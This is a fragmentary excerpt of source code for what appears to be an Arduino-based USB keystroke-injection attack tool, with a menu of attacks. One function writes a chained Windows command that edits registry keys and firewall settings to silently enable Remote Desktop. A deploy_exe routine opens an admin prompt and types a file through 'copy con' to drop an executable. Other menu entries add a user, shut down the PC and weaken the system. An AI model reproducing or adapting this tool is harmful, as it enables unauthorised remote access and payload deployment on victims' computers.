...
void write_file(){
  ...
  if (myFile) {
    ...
    myFile.println("reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add \"HKLM\\System\\CurrentControlSet\\Services\\TermService\" /v Start /t REG_DWORD /d 2 /f && REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && sc start termservice & netsh firewall set service type = remotedesktop mode = enable");
    myFile.close();
    Serial.println("done.");
  } else {
...
void deploy_exe(){
        ...
        admin_cmd();
        char fff[]="DEXE.txt";
        Keyboard.print("copy con C:\\mid-exe.txt");
        Keyboard.press(KEY_ENTER);
        Keyboard.release(KEY_ENTER);
        delay(100);
        read_file(fff);  
...
String Main_Menu2[4][5][5] =
{
  ...
  {{"BUNY", "SYST", "ARCH", "MEAN", "PALD"}, {"ERDP", 66, 67, "DEXE", 69}, {"SHUT", 71, 72, 73, 74}, {"AUSR", 76, 77, 78, 79}, {"DDFR", 9, 9, 9, 9}}
};
int cursor_pp = 0;
...
foo func[4][5][5]=
{
  ...
  {{&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}},
  {{&enable_rdp,&shutdown_pc,&add_user,&Make_system_prone,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&deploy_exe, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}}
};
